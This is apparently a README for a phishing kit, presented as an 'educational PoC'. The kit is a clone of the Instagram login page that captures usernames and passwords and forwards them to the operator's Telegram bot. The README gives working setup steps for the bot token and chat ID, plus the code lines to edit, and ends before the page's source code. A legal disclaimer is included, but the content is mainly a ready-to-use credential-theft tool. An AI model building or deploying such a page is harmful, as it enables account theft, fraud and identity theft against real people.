# Instagram Phishing Page (Educational PoC)

This is a **proof-of-concept (PoC)** fake Instagram login page designed for **educational, red team, and cybersecurity awareness purposes only**.

It mimics the official Instagram login interface and captures entered credentials (username + password), then sends them to a Telegram bot/chat.

Be Warned!!!!

**⚠️ WARNING – LEGAL & ETHICAL NOTICE**  
This code is **malicious** when used against real users.  
Using this page to steal credentials is a serious crime (phishing, fraud, identity theft, unauthorized access) under Kenya's Computer Misuse and Cybercrimes Act and international laws.  
**ONLY use in controlled lab environments, on systems you own, or with explicit written permission** (e.g., during authorized penetration testing).  
Do NOT deploy on real people, public websites, or production systems.

## Features
- Pixel-perfect Instagram login page clone (2025 style)
- Responsive design (mobile-friendly)
- Phone mockup on the left (hidden on small screens)
- Sends captured credentials to your Telegram bot/chat instantly
- Shows success/failure alert to the user
- Auto-resets form after submission

## How It Works
1. User visits the page and enters username/email/phone + password
2. On "Log in" click → JavaScript prevents normal submission
3. Credentials are sent via Telegram Bot API to your chat ID
4. User sees fake "Credentials sent successfully!" alert
5. Form is cleared (ready for next victim in demo)

## Setup Instructions

### 1. Create a Telegram Bot
- Open Telegram → search for @BotFather
- Send `/newbot` → follow steps to create bot
- Copy the **bot token** (looks like `123456789:AAFdoFVYs2SHFkIloIu5fkMRL56A7zqxiug`)

### 2. Get Your Chat ID
- Message your bot anything
- Then go to:  
  `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
- Look for `"chat":{"id":7646846586,...}` → copy the number (chat ID)

### 3. Update the Code
Open `index.html` and replace these two lines:

```javascript
const botToken = "YOUR_BOT_TOKEN_HERE";
const chatId = "YOUR_CHAT_ID_HERE";
